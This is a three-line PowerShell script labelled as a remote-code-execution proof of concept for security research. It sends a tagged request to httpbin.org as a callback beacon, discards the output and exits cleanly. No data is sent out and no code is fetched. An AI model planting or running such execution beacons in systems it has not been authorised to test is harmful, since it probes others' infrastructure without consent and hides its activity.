# PoC RCE - security research
Invoke-WebRequest -Uri "https://httpbin.org/get?poc=cloudflare_azure_sentinel_rce" -UseBasicParsing | Out-Null
exit 0
